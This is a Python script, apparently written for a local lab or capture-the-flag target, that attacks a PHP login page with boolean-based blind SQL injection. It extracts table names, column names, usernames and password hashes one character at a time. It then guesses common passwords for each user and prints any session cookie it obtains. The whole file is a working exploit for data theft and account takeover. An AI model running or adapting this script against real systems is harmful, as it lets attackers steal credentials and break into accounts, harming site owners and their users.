import requests
import time

# Configuration
BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

# Session
session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

def test_injection(payload):
    """Test SQL injection - returns True if response contains 'password'"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        return "password" in response.text
    except:
        return False

def blind_extract(query, max_length=100):
    """Extract data using boolean-based blind SQL injection"""
    result = ""
    
    for pos in range(1, max_length + 1):
        # Binary search for character
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            test_payload = f"admin' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- "
            
            if test_injection(test_payload):
                low = mid + 1
            else:
                high = mid - 1
        
        char_code = low
        if char_code == 0:  # NULL - end of string
            break
            
        if 32 <= char_code <= 126:
            char = chr(char_code)
            result += char
            print(f"[+] Position {pos}: '{char}'")
        else:
            # Try extended ASCII
            char = chr(char_code)
            result += char
            print(f"[+] Position {pos}: '{char}' (extended)")
    
    return result

def extract_all_users():
    """Extract all usernames from the database"""
    print("\n" + "="*60)
    print("EXTRACTING ALL USERNAMES")
    print("="*60)
    
    users = []
    for i in range(0, 10):  # Try first 10 users
        query = f"SELECT username FROM users LIMIT 1 OFFSET {i}"
        username = blind_extract(query, max_length=50)
        if username:
            print(f"[+] User {i+1}: {username}")
            users.append(username)
        else:
            print(f"[+] No more users found after {i}")
            break
    
    return users

def extract_all_tables():
    """Extract table names from information_schema"""
    print("\n" + "="*60)
    print("EXTRACTING TABLE NAMES")
    print("="*60)
    
    tables = []
    for i in range(0, 20):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {i}"
        table = blind_extract(query, max_length=50)
        if table:
            print(f"[+] Table {i+1}: {table}")
            tables.append(table)
        else:
            break
    
    return tables

def extract_all_columns(table_name):
    """Extract column names from a table"""
    print(f"\n" + "="*60)
    print(f"EXTRACTING COLUMNS FROM TABLE: {table_name}")
    print("="*60)
    
    columns = []
    for i in range(0, 20):
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {i}"
        column = blind_extract(query, max_length=50)
        if column:
            print(f"[+] Column {i+1}: {column}")
            columns.append(column)
        else:
            break
    
    return columns

def authenticate(username, password):
    """Attempt authentication"""
    print(f"\n[+] Attempting authentication - Username: {username}, Password: {password}")
    
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    response_text = response.text
    
    print(f"[+] Response: {response_text}")
    
    if "Success" in response_text:
        print(f"[!] SUCCESS! Authentication worked!")
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            return cookies["PHPSESSID"]
    
    return None

# Test injection working
print("="*60)
print("MANUAL VERIFICATION AND EXTRACTION")
print("="*60)

print("\n[+] Verifying injection works...")
if test_injection("admin' AND 1=1-- "):
    print("[+] TRUE test passed")
if not test_injection("admin' AND 1=2-- "):
    print("[+] FALSE test passed")

# Now let's extract everything systematically
users = extract_all_users()

if users:
    print(f"\n[+] Found users: {users}")
    
    # For each user, try to extract their password and any other fields
    for username in users:
        print(f"\n" + "="*60)
        print(f"EXTRACTING DATA FOR USER: {username}")
        print("="*60)
        
        # Extract password
        password_query = f"SELECT password FROM users WHERE username='{username}'"
        password = blind_extract(password_query, max_length=100)
        print(f"[+] Password hash: {password}")
        
        # Try to authenticate with common passwords
        common_pwds = ["admin", "admin123", "password", "123456", "root", username, username + "123"]
        for pwd in common_pwds:
            phpsessid = authenticate(username, pwd)
            if phpsessid:
                print(f"\n" + "="*60)
                print("AUTHENTICATION SUCCESSFUL!")
                print("="*60)
                print(f"Username: {username}")
                print(f"Password: {pwd}")
                print(f"PHPSESSID: {phpsessid}")
                break
        else:
            # If common passwords didn't work, try the hash as password (some systems store plaintext)
            print(f"[+] Trying hash as password...")
            phpsessid = authenticate(username, password)
            if phpsessid:
                print(f"\n" + "="*60)
                print("AUTHENTICATION SUCCESSFUL WITH HASH!")
                print("="*60)
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"PHPSESSID: {phpsessid}")
                break

print("\n" + "="*60)
print("MANUAL VERIFICATION COMPLETE")
print("="*60)
